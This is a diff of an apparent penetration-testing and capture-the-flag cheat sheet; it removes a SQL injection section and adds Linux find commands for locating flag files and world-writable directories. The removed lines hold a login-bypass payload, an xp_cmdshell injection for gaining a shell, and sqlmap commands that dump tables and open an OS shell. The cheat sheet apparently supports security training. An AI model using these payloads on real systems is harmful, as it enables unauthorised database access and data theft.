@@ -56,36 +56,6 @@ Useful nmap scripts:
 
 </details>
 
-# SQL Injection
-
-For SQL injection focused task either perform the injection manually or use sqlmap tool. Check fields using single quote or encoded single quote.
-
-```blah' or 1=1 --``` - Basic login bypass payload. Adjust for specific case.
-
-```blah';exec master..xp_cmdshell 'ping [URL] -l 65000 -t'; --``` - Example command to pop shell through sql injection.
-
-<details>
-<summary>sqlmap</summary>
-
-```sudo sqlmap -u “[URL]” --cookie="[cookie_value]" --dbs``` - Initial command to enumerate databases (--dbs). Add cookie values if necessary (--cookie).
-
-To get the cookie for this login -> inspect element -> console -> type ```document.cookie```
-
-```sudo sqlmap -u “[URL]” -D [database_name] --tables``` - Enumerate tables in the specified database (--tables).
-
-```sudo sqlmap -u “[URL]” -D [database_name] -T [table_name] --columns``` - Enumerate columns in the specified table (--columns).
-
-```sudo sqlmap -u “[URL]” -D [database_name] -T [table_name] --dump``` - Dump all data from table (--dump).
-
-```sudo sqlmap -u “[URL]” --os-shell``` - Pop shell through sqlmap (--os-shell).
-
-```sudo sqlmap -r [filename] --batch -v 5 | tee [output]``` - Use sqlmap with request from file (-r), for example, captured by Burp. This command also uses standard behaviour (--batch) and saves the output to a file (| tee)
-
-
-</details>
-
-
-
 # Malware Threats
 
 <details>
@@ -145,6 +115,25 @@ To check for files in the conversations use export option. File -> Export -> HTT
 OR use SCP, SFTP or FTP protocols.
 
 ```scp /path/to/local/file.txt <user>@$IP:$PORT:/path/to/remote/``` - SCP file transfer example.
+
+# Finding Files on Linux
+
+```find . -name flag1.txt``` - find the file named “flag1.txt” in the current directory.
+```find /home -name flag1.txt``` - find the file names “flag1.txt” in the /home directory.
+```find / -type d -name config``` - find the directory named config under “/”.
+```find / -type f -perm 0777``` - find files with the 777 permissions (files readable, writable, and executable by all users).
+```find / -perm a=x``` - find executable files.
+```find /home -user frank``` - find all files for user “frank” under “/home”.
+```find / -mtime 10``` - find files that were modified in the last 10 days.
+```find / -atime 10``` - find files that were accessed in the last 10 day.
+```find / -cmin -60``` - find files changed within the last hour (60 minutes).
+```find / -amin -60``` - find files accesses within the last hour (60 minutes).
+```find / -size 50M``` - find files with a 50 MB size.
+    
+```find / -writable -type d 2>/dev/null``` - Find world-writeable folders.
+```find / -perm -222 -type d 2>/dev/null``` - Find world-writeable folders.
+```find / -perm -o w -type d 2>/dev/null``` - Find world-writeable folders.
+
 
 # Wireless Attacks
 <details>
